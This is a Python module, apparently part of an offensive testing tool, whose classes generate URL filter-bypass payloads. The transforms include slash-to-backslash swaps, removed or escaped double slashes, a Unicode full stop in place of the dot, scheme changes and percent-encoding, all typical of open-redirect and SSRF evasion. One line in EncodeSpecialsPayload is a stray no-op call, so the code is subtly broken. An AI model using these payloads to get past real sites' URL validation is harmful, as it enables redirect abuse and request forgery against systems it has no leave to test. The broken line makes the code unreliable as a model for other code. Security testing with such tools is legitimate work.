from ._base import PayloadStrategy
from urllib.parse import quote
from ._utils import change_scheme

#====================================================================== 
# Slash
#====================================================================== 

class SlashToBackslashPayload(PayloadStrategy):

    def generate(self, url):
        target_url = super().generate(url)
        payload = target_url.replace("/", "\\")
        return payload

class EscapeDoubleslashPayload(PayloadStrategy):

    def generate(self, url):
        target_url = super().generate(url)
        payload = target_url.replace("//", "\\/\\/")
        return payload


class NoSlashesPayload(PayloadStrategy):

    def generate(self, url):
        target_url = super().generate(url)
        payload = target_url.replace("//", "", 1)
        return payload

#====================================================================== 
# Dot
#====================================================================== 

class UnicodeDotPayload(PayloadStrategy):

    def generate(self, url):
        target_url = super().generate(url)
        payload = target_url.replace(".", "%e3%80%82")
        return payload

#====================================================================== 
# Scheme
#====================================================================== 

class ChangeSchemePayload(PayloadStrategy):

    def __init__(self, add_tracking, *, new_scheme, **kwargs):
        super().__init__(add_tracking, **kwargs)
        self.new_scheme = new_scheme

    def generate(self, url):
        target_url = super().generate(url)
        payload = change_scheme(target_url, self.new_scheme)
        return payload

#====================================================================== 
# Encoding
#====================================================================== 

class EncodeSpecialsPayload(PayloadStrategy):

    def generate(self, url):
        target_url = super().generate(url)
        payload = quote(target_url, safe='')
        payload.replace
        return payload

class EncodeKeepSlashPayload(PayloadStrategy):

    def generate(self, url):
        target_url = super().generate(url)
        payload = quote(target_url)
        return payload
